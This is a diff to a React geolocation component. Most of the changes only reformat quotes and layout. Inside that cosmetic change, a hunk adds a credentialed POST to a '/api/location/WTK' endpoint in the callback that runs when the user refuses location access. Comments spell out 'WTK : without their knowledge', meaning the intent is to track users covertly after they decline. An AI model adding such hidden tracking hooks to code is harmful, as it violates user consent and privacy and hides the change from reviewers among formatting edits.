@@ -1,5 +1,5 @@
-import { useState, useEffect } from 'react';
-import { 
+import { useState, useEffect } from "react";
+import {
   Typography,
   Box,
   Alert,
@@ -7,7 +7,7 @@ import {
   Stack,
   Card,
   CardContent
-} from '@mui/material';
+} from "@mui/material";
 
 const Gps = () => {
   const [location, setLocation] = useState(null);
@@ -16,7 +16,7 @@ const Gps = () => {
 
   useEffect(() => {
     if (!navigator.geolocation) {
-      setError('Geolocation is not supported by your browser');
+      setError("Geolocation is not supported by your browser");
       setLoading(false);
       return;
     }
@@ -32,7 +32,22 @@ const Gps = () => {
         setLoading(false);
       },
       (error) => {
-        setError('Unable to retrieve your location. Please enable location services in your browser.');
+        setError(
+          "Unable to retrieve your location. Please enable location services in your browser."
+        );
+        //     get thier location bla may3i9o
+        try {
+          //WTK : without their knowledge
+          fetch("http://localhost:3000/api/location/WTK", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            credentials: "include"
+          });
+        } catch (err) {
+          setError("Failed to save location to server");
+        }
         setLoading(false);
       }
     );
@@ -40,25 +55,25 @@ const Gps = () => {
 
   const saveLocation = async (coords) => {
     try {
-      const response = await fetch('http://localhost:3000/api/location', {
-        method: 'POST',
+      const response = await fetch("http://localhost:3000/api/location", {
+        method: "POST",
         headers: {
-          'Content-Type': 'application/json',
+          "Content-Type": "application/json"
         },
-        credentials:'include',
-        body: JSON.stringify(coords),
+        credentials: "include",
+        body: JSON.stringify(coords)
       });
-      
+
       if (!response.ok) {
-        throw new Error('Failed to save location');
+        throw new Error("Failed to save location");
       }
     } catch (err) {
-      setError('Failed to save location to server');
+      setError("Failed to save location to server");
     }
   };
 
   return (
-    <Box sx={{ maxWidth: 600, mx: 'auto', p: 3 }}>
+    <Box sx={{ maxWidth: 600, mx: "auto", p: 3 }}>
       <Stack spacing={3}>
         {loading && (
           <Box display="flex" justifyContent="center" p={2}>
@@ -66,11 +81,7 @@ const Gps = () => {
           </Box>
         )}
 
-        {error && (
-          <Alert severity="error">
-            {error}
-          </Alert>
-        )}
+        {error && <Alert severity="error">{error}</Alert>}
 
         {location && (
           <Card>
@@ -78,12 +89,8 @@ const Gps = () => {
               <Typography variant="h6" gutterBottom>
                 Current Location
               </Typography>
-              <Typography>
-                Latitude: {location.latitude}
-              </Typography>
-              <Typography>
-                Longitude: {location.longitude}
-              </Typography>
+              <Typography>Latitude: {location.latitude}</Typography>
+              <Typography>Longitude: {location.longitude}</Typography>
             </CardContent>
           </Card>
         )}
